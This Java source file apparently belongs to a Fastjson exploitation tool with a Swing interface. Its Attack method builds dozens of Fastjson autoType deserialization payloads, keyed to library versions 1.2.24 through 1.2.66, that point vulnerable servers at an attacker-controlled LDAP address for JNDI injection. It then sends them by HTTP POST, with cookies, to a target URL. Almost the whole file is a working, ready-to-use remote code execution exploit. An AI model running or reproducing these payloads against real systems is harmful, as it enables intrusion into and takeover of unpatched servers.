package com.forger.fastJsonScan;

import javax.swing.*;
import java.util.ArrayList;
import java.util.List;

public class Api{
    public static void main(String[] args) throws Exception {
    }
    /**
    * 选择payload攻击并输出信息
    * @Parmes
    * url 目标ip
    * ldAddress ldapip地址
    * fjVersion 选择的fastjson版本
    */
    public static String Attack(String url, String ldAddress, String fjVersion, String Cookie, JRadioButton allUse, JTextArea output){
        //单选对应版本payload
        String fjPayload = "";
        String fjPayload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://" + ldAddress +"\", \"autoCommit\":true}";
        String fjPayload2 = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://" + ldAddress +"\", \"autoCommit\":true}";
        String fjPayload3 = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://" + ldAddress +"\", \"autoCommit\":true}";
        String fjPayload4 = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://" + ldAddress +"\", \"autoCommit\":true}";
        String fjPayload5 = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://" + ldAddress +"\"}}";
        String fjPayload6 = "{\"a\": {\"@type\": \"java.lang.Class\",\"val\": \"com.sun.rowset.JdbcRowSetImpl\"}, \"b\": {\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"ldap://" + ldAddress +"\",\"autoCommit\": true}}";
        String fjPayload7 = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://" + ldAddress +"\"}\"";
        String fjPayload8 = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\"：{\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://" + ldAddress +"\"}}";
        //全选额外增加的paylaod
        List<String> payloads = new ArrayList<String>();
        payloads.add("{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://" + ldAddress +"\",\"autoCommit\":true}}");
        payloads.add("{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://" + ldAddress +"\"}");
        payloads.add("{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://" + ldAddress +"\"}");
        payloads.add("{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"ldap://" + ldAddress +"\"}");
        payloads.add("{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"ldap://" + ldAddress +"\"}}:\"ddd\"}");
        payloads.add("{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://" + ldAddress +"\"}");
        payloads.add("{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"dap://" + ldAddress +"\",\"autoCommit\":true}}");
        payloads.add("{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://" + ldAddress +"\",\"autoCommit\":true}");
        payloads.add("{\"@type\":\"LL\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://" + ldAddress +"\",\"autoCommit\":true}");
        payloads.add("{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://" + ldAddress +"\",\"autoCommit\":true}}}");
        payloads.add("{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"ldap://" + ldAddress +"\"}");
        payloads.add("{\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"ldap://" + ldAddress +"\"}");
        payloads.add("{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://" + ldAddress +"\"}");
        payloads.add("{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://" + ldAddress +"\"}}");
        payloads.add("{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\":{\"UserTransaction\":\"ldap://" + ldAddress +"\"}}");
        payloads.add("{\"@type\":sss\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://" + ldAddress +"\"}");
        payloads.add("{\"@type\":/**/\"Lcom.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://" + ldAddress +"\",\"autoCommit\":true}");
        payloads.add("{\"@type\":sss\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://" + ldAddress +"\\\"}");
        payloads.add("{\"@type\":sss\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\":{\"UserTransaction\":\"ldap://" + ldAddress +"\"}}");
        payloads.add("{\"@type\":sss\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://" + ldAddress +"\"}");
        payloads.add("Set [{\"@type\":sss\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":[\"ldap://" + ldAddress +"\\\"]},\"adviceBeanName\":\"ldap://" + ldAddress +"\\\"},{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",}]");
        payloads.add("{\"@type\":sss\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"ldap://" + ldAddress +"\\\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}");
        payloads.add("{\"@type\":/**/\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://" + ldAddress +"\"}");
        payloads.add("{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://" + ldAddress +"\",\"\"autoCommit\":true}");
        payloads.add("{\"@type\":\"LLcom.sun.rowset.RowSetImpl;;\",\"dataSourceName\":\"ldap://" + ldAddress +"\",\"\"autoCommit\":true}");
        payloads.add("{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\"{\"data_source\":\"ldap://" + ldAddress +"\"}} ");
        payloads.add("{\"@type\":\"Lcom.sun.rowset.RowSetImpl;\",\"dataSourceName\":\"ldap://" + ldAddress +"\",\"autoCommit\":true}");
        payloads.add("{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://" + ldAddress +"\"}");
        payloads.add("{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"ldap://" + ldAddress +"\"}");
        payloads.add("{\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"ldap://" + ldAddress +"\"}" );
        payloads.add("{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://" + ldAddress +"\"}");
        payloads.add("{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\":{\"UserTransaction\":\"ldap://" + ldAddress +"\"}}");
        payloads.add("{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://" + ldAddress +"\"}");
        payloads.add("{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://"+ ldAddress +"\"}");
        payloads.add("{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://"+ ldAddress +"\"}");
        payloads.add("{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"ldap://"+ ldAddress +"\"}");
        //判断fstjson版本单选值
        if (fjVersion == "fastjson-1.2.24"){fjPayload = fjPayload1;}
        else if (fjVersion == "fastjson-1.2.41"){fjPayload = fjPayload2;}
        else if (fjVersion == "fastjson-1.2.42"){fjPayload = fjPayload3;}
        else if (fjVersion == "fastjson-1.2.43"){fjPayload = fjPayload4;}
        else if (fjVersion == "fastjson-1.2.45"){fjPayload = fjPayload5;}
        else if (fjVersion == "fastjson-1.2.47"){fjPayload = fjPayload6;}
        else if (fjVersion == "fastjson-1.2.62"){fjPayload = fjPayload7;}
        else if (fjVersion == "fastjson-1.2.66"){fjPayload = fjPayload8;}
        else {fjPayload = "";}
        //判断是否全选，然后吧所有的payload全打一遍
        out:if (allUse.isSelected()){
            for (String payload:payloads){
                output.append("目标-->" + url + "\n");
                output.append("ldap-->" + ldAddress + "\n");
                output.append("PayLoad-->" + payload + "\n");
                output.append(fastJsonScan.sendPost(url, payload, Cookie) + "\n");
                output.append("\n" + "--------------------------------------------" + '\n');
            }
            String [] PayloadList = {fjPayload1, fjPayload2, fjPayload3, fjPayload4, fjPayload5, fjPayload6, fjPayload7, fjPayload8};
            for (String List: PayloadList){
                output.append("目标-->" + url + "\n");
                output.append("ldap-->" + ldAddress + "\n");
                output.append("PayLoad-->" + List + "\n");
                output.append(fastJsonScan.sendPost(url, List, Cookie) + "\n");
                output.append("\n" + "--------------------------------------------" + '\n');
            }
            output.append("Attack completed, please check result..." + "\n");
            break out;
        }
        else {
            if (fjPayload != "") {
                output.append("目标-->" + url + "\n");
                output.append("ldap-->" + ldAddress + "\n");
                output.append("PayLoad-->" + fjPayload + "\n");
                output.append(fastJsonScan.sendPost(url, fjPayload, Cookie) + "\n");
                output.append("\n" + "--------------------------------------------" + '\n');
                output.append("Attack completed, please check result..." + "\n");
            } else {
                output.append("--Error! 请选择fastjson版本!" + "\n");
                JOptionPane.showMessageDialog(null, "请选择fastjson版本.", "Error",JOptionPane.ERROR_MESSAGE);
            }
        }
        return fjVersion;
    }
}